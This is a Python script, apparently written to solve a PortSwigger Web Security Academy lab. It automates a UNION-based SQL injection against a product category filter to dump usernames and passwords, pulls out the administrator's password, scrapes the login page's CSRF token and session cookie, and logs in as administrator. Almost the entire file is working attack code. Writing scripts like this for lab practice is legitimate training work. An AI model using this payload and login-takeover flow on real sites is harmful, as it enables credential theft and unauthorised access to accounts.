import requests
import argparse
import bs4

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. E.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-union-otehrtables.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# create the payload
payload = args.target + "/filter?category=Accessories' UNION SELECT username,password FROM users--"
print('[*] Payload created: ' + payload)

r = requests.get(payload)
if r.status_code == 200:
    print('[*] Payload sent')
    # get the admin password
    completion_text = b'<th>administrator</th>'
    if completion_text in r.content:
        print('[*] Found the admin credentials')
        # print the admin credentials
else:
    print('[!] Exploit failed')
    exit(0)

# get the admin password
soup = bs4.BeautifulSoup(r.content, 'html.parser')
rows = soup.select('tbody tr')

for row in rows:
    th = row.find_all('th')
    th_string = str(th[0])
    if th_string == '<th>administrator</th>':
        td = row.find_all('td')
        td_string = str(td[0])
        td_splitting_1 = td_string.split('>')
        td_splitting_2 = td_splitting_1[1].split('<')
        username = "administrator"
        password = td_splitting_2[0]
        print('[*] Administrator password is ' + password)

# get the session & csrf token
payload_2 = args.target + "/login"
r = requests.get(payload_2)
session_cookie = r.cookies
soup_2 = bs4.BeautifulSoup(r.content, 'html.parser')
rows_2 = soup_2.select('form input')
for row in rows_2:
    if 'csrf' in str(row):
        matched_row = str(row)
        csrf_token = matched_row.split('"')
        if csrf_token[7]:
            csrf_token_data = str(csrf_token[7])
            print('[*] Got the CSRF Token: ' + csrf_token_data)
        else:
            print('[!] Could not get the CSRF token')
            exit(0)

# post the login request & check for success
payload_3 = args.target + "/login"
payload_3_data = {
    "csrf": csrf_token_data,
    "username": username,
    "password": password
}
#payload_3_data = "csrf=" + csrf_token_data + "&username=" + username + "&password=" + password

r = requests.post(payload_3, data=payload_3_data, cookies=session_cookie)
if r.status_code == 200:
    print('[*] Payload sent')
    # check the contents of the file
    completion_text = b'Congratulations'
    if completion_text in r.content:
        print('[*] Success')
else:
    print('[!] Exploit failed')
    exit(0)
